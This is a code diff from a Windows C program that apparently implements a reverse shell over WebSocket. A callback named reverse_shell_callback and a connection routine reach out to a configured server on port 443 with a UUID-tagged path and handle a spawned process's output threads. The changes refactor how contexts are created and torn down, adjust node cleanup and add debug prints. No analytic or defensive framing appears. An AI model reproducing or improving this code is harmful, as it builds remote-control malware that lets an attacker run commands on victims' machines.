@@ -50,9 +50,8 @@ INT reverse_shell_callback(struct lws* socket, enum lws_callback_reasons reason,
 		return -1;
 		break;
 
-	case LWS_CALLBACK_WSI_DESTROY:
 	case LWS_CALLBACK_CLIENT_CLOSED:
-
+		printf("WSDATA = %p\n", wsData);
 		if (wsData->hThreadReadStdout)
 		{
 			BOOL ret = TerminateThread(wsData->hThreadReadStdout, 0);
@@ -69,7 +68,7 @@ INT reverse_shell_callback(struct lws* socket, enum lws_callback_reasons reason,
 			printf("Process ended: GetLastError(%d)\n", GetLastError());
 		}
 
-		//del_node(&listWebSockets, index_of_node(listWebSockets.head, (Node*)user));
+		del_node(&listWebSockets, index_of_node(listWebSockets.head, node_of_data(listWebSockets.head, user)));
 		return -1;
 		break;
 	}
@@ -80,27 +79,22 @@ INT reverse_shell_callback(struct lws* socket, enum lws_callback_reasons reason,
 // Make the connection with the server
 BOOL WebSocketConnection()
 {
-	if (!context)
-	{
-		struct lws_context_creation_info ctxInfo = { 0 };
-		ctxInfo.options = LWS_SERVER_OPTION_DO_SSL_GLOBAL_INIT;
-		ctxInfo.port = CONTEXT_PORT_NO_LISTEN;
-		ctxInfo.protocols = protocols;
-
-		if (!(context = lws_create_context(&ctxInfo)))
-		{
-			lwsl_err("lws init failed\n");
-			return FALSE;
-		}
-	}
-
 	Node* node = add_node(&listWebSockets);
 	if (!node)
 		return FALSE;
-	init_data_web_wocket(node);
-
+	init_node_data(node, sizeof(WebSocketData));
 	WebSocketData* wsData = (WebSocketData*)node->data;
-	struct lws_client_connect_info connectInfo = { 0 };
+
+	struct lws_context_creation_info ctxInfo = { 0 };
+	ctxInfo.options = LWS_SERVER_OPTION_DO_SSL_GLOBAL_INIT;
+	ctxInfo.port = CONTEXT_PORT_NO_LISTEN;
+	ctxInfo.protocols = protocols;
+
+	if (!(wsData->context = lws_create_context(&ctxInfo)))
+	{
+		lwsl_err("lws init failed\n");
+		return FALSE;
+	}
 
 	CHAR path[URL_SIZE] = { 0 };
 	CHAR uuid[INFORMATION_SIZE] = { 0 };
@@ -108,7 +102,9 @@ BOOL WebSocketConnection()
 	if (StringCbPrintfA(path, sizeof(path), "%s?%s", REVERSE_SHELL_WS_A, uuid) != S_OK)
 		return FALSE;
 
-	connectInfo.context = context;
+	struct lws_client_connect_info connectInfo = { 0 };
+
+	connectInfo.context = wsData->context;
 	connectInfo.address = SERVER_NAME_A;
 	connectInfo.port = 443;
 	connectInfo.path = path;
@@ -122,11 +118,13 @@ BOOL WebSocketConnection()
 
 	for (INT i = 0; i >= 0; )
 	{
-		i = lws_service(context, 0);
+		if (node == NULL)
+			break;
+		i = lws_service(wsData->context, 0);
 		printf("%d\n", i);
 	}
 
-	//lws_context_destroy(context);
+	lws_context_destroy(wsData->context);
 
 	lwsl_user("Completed\n");
 
